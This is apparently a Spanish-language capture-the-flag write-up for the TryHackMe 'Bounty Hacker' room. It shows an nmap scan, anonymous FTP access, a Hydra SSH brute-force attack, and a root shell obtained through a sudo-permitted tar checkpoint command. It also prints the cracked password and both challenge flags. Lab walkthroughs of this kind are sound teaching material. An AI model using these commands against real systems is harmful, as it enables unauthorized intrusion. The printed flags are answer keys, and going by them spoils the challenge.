# Bounty Hacker

## Escaneo de puertos

Realizamos un mapeo de puertos para ver que servicios están disponibles y son vulnerables mediante el uso de`nmap`.

```
sudo nmap -sV -T4 -p- 10.10.85.142
```

Tenemos tres puertos abiertos, el 21 (FTP), el 22 (SSH) y el 80 (HTTP).

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image.png)

## Acceso por FTP

Accedemos de forma anónima al servidor FTP. Desactivamos el modo pasivo, de esta forma es el servidor el que inicia la conexión.

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-1.png)

Encontramos dos archivos y los descargamos con el comando`get`.

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-2.png)

En el archivo`task.txt`encontramos a un usuario llamado`lin`.

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-3.png)

Y en el de`locks.txt`varias contraseñas que podrían ser la de usuario.

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-4.png)

## Ataque de fuerza bruta con Hydra

Usando como diccionario el archivo`locks.txt`, ejecutamos un ataque de fuerza bruta online sobre el servicio SSH con la herramienta`hydra`.

```
hydra -l lin -P locks.txt ssh://10.10.85.142 
```

La contraseña de`lin`es `RedDr4gonSynd1cat3`.
![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-5.png)

## Acceso por SSH

Mediante los credenciales obtenidos, entramos por el servicio SSH.

```
ssh lin@10.10.85.142  
```

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-6.png)

Obtenemos la flag del`user.txt`.

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-7.png)

```
THM{CR1M3_SyNd1C4T3}
```

## Escalada de privilegios

Comprobamos los permisos de sudo que tiene el usuario para ver si hay algún binario explotable para obtener privilegios de root.

```
sudo -l
```

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-8.png)

El binario`/bin/tar`puede explotarse según [GTFOBins](https://gtfobins.github.io/gtfobins/tar/).

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-9.png)

Ejecutamos el comando directamente y somos root.

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-10.png)

Nos ubicamos en la carpeta de root y obtenemos la flag final.

![](Hacking_Etico/TryHackMe_WriteUps/Bounty_Hacker/images/image-11.png)

```
THM{80UN7Y_h4cK3r}
```





